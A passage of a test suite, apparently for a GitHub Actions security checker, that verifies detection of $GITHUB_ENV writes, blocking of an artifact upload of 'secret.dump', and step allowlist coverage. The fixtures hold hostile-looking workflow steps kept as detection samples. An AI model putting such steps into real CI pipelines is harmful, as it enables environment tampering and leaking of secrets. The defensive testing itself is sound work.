      "runs:",
      "  using: composite",
      "  steps:",
      "    - id: s",
      "      run: echo x >> $GITHUB_ENV",
      "      shell: bash",
      "",
    ].join("\n");
    expect(findForbiddenUploadCommands(envWrite, "actions/env/action.yml").map((h) => h.kind)).toEqual(
      expect.arrayContaining(["GITHUB_ENV", "step allowlist"]),
    );

    const upload = [
      "name: up",
      "runs:",
      "  using: composite",
      "  steps:",
      "    - id: s",
      "      uses: actions/upload-artifact@sha",
      "      with:",
      "        path: secret.dump",
      "",
    ].join("\n");
    expect(() => assertWorkflowUploadAllowlist(upload, "actions/up/action.yml")).toThrow(/secret\.dump/);

    const honest = collectWorkflowUnits(miniAction).units[0];
    const entry = {
      file: "actions/demo/action.yml",
      job: "runs",
      id: "s",
      sha256: unitHash(honest),
    };
    expect(findForbiddenUploadCommands(miniAction, "actions/demo/action.yml", { allowlist: [entry] })).toEqual([]);
    expect(isUnitAllowlisted("actions/demo/action.yml", honest, [entry])).toBe(true);

    const github = fakeGithub({
      "workflows/ok.yml": miniWorkflow,
      "actions/demo/action.yml": miniAction,
    });
    const needed = neededAllowlist(github);
    expect(needed.steps.some((s) => s.file === "actions/demo/action.yml" && s.job === "runs" && s.id === "s")).toBe(
      true,
    );
    expect(needed.job_steps.some((j) => j.file === "actions/demo/action.yml" && j.job === "runs")).toBe(true);
    expect(() =>
      assertAllowlistCoverage(github, {
        ...needed,
        workflow_jobs: [...needed.workflow_jobs, { file: "deleted.yml", jobs: ["gone"], sha256: "0" }],
        job_steps: [...needed.job_steps, { file: "ok.yml", job: "ghost", ids: ["n"], sha256: "0" }],
        steps: [...needed.steps, { file: "ok.yml", job: "t", id: "removed", sha256: "0" }],
      }),
    ).toThrow(/orphan|deleted\.yml|ghost|removed/);
    expect(() => assertAllowlistCoverage(github, needed)).not.toThrow();
  });
});
